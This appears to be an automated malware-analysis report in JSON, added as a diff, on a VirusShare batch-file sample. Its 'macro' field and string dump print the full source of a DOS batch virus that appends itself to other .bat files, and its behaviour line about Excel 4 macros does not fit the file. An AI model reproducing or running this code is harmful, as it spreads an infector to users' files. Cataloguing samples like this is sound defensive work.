@@ -1,0 +1,44 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "call": "May call a DLL using Excel 4 Macros"
+        },
+        "macro": "@echo off\ngoto _%1\n:_\narj a BATonLee.arj BATonLee.*>nul\nfor %%a in (*.bat) do call %0 i %%a\ngoto _e\n:_i\narj l %2>nul\nif errorlevel 1 goto _notinfected\ngoto _e\n:_notinfected\ncopy /a %2+BATonLee.dat BATonLee.tmp>nul\ncopy /b BATonLee.tmp+BATonLee.arj %2>nul\n:_e"
+    },
+    "filename": "VirusShare_ff8c0cf97e0b7c40f13e5904cfa52995",
+    "filesize": 273,
+    "filetype": "DOS batch file, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "ff8c0cf97e0b7c40f13e5904cfa52995",
+        "sha1": "8517953d2f52c0ede0362bc87c28555dd78eff65",
+        "sha256": "858ad3745e9975b6307f6f18ac5be247b95648e6ec100e542cd8f5ac0e5a0186"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "@echo off",
+            "goto _%1",
+            "arj a BATonLee.arj BATonLee.*>nul",
+            "for %%a in (*.bat) do call %0 i %%a",
+            "goto _e",
+            "arj l %2>nul",
+            "if errorlevel 1 goto _notinfected",
+            "goto _e",
+            ":_notinfected",
+            "copy /a %2+BATonLee.dat BATonLee.tmp>nul",
+            "copy /b BATonLee.tmp+BATonLee.arj %2>nul"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.264732",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
